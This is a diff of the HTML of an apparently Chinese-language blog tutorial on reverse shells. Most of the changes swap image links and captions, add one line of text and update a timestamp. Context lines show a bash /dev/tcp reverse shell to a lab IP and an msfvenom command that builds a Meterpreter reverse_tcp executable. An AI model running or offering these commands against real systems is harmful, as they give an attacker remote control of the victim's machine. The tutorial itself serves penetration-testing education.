@@ -229,10 +229,11 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>受害机执行反弹命令(自动连接监听的端口)</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.65.148/9999 0&gt;&amp;1</span><br><span class="line"><span class="meta">#</span>bash -i 用于产生一个交互的shell</span><br><span class="line"><span class="meta">#</span>/dev/tcp/ip/port 作用相当于建立一个sockt连接</span><br></pre></td></tr></table></figure>
 
 <figure class="image-box">
-                <a rel=反弹Shell href="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1609518776337.png" title="1609514612069" data-fancybox="images"><img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1609518776337.png" alt="1609514612069" title class></a>
-                <p>1609514612069</p>
+                <a rel=反弹Shell href="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1609514612069.png" title="1609518776337" data-fancybox="images"><img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1609514612069.png" alt="1609518776337" title class></a>
+                <p>1609518776337</p>
             </figure>
 
+<p>攻击机查看ip如下为受害者ip</p>
 <figure class="image-box">
                 <a rel=反弹Shell href="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1609514726946.png" title="1609514726946" data-fancybox="images"><img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1609514726946.png" alt="1609514726946" title class></a>
                 <p>1609514726946</p>
@@ -276,8 +277,8 @@
 <h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.65.148 LPORT=9999 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>
 
 <h3 id="Cobaltstrike"><a href="#Cobaltstrike" class="headerlink" title="Cobaltstrike"></a>Cobaltstrike</h3><figure class="image-box">
-                <a rel=反弹Shell href="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1609514612069.png" title="1609518776337" data-fancybox="images"><img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1609514612069.png" alt="1609518776337" title class></a>
-                <p>1609518776337</p>
+                <a rel=反弹Shell href="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1609518776337.png" title="1609514612069" data-fancybox="images"><img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1609518776337.png" alt="1609514612069" title class></a>
+                <p>1609514612069</p>
             </figure>
 
 <h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/2549#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/2549#toc-5</a></p>
@@ -292,7 +293,7 @@
     <div class="content">
         
 <span class="post-time">
-    Last updated: <time datetime="2021-02-27T12:29:01.999Z" itemprop="dateUpdated">2021-02-27 20:29:01</time>
+    Last updated: <time datetime="2021-04-28T01:49:40.575Z" itemprop="dateUpdated">2021-04-28 09:49:40</time>
 </span><br>
 
 
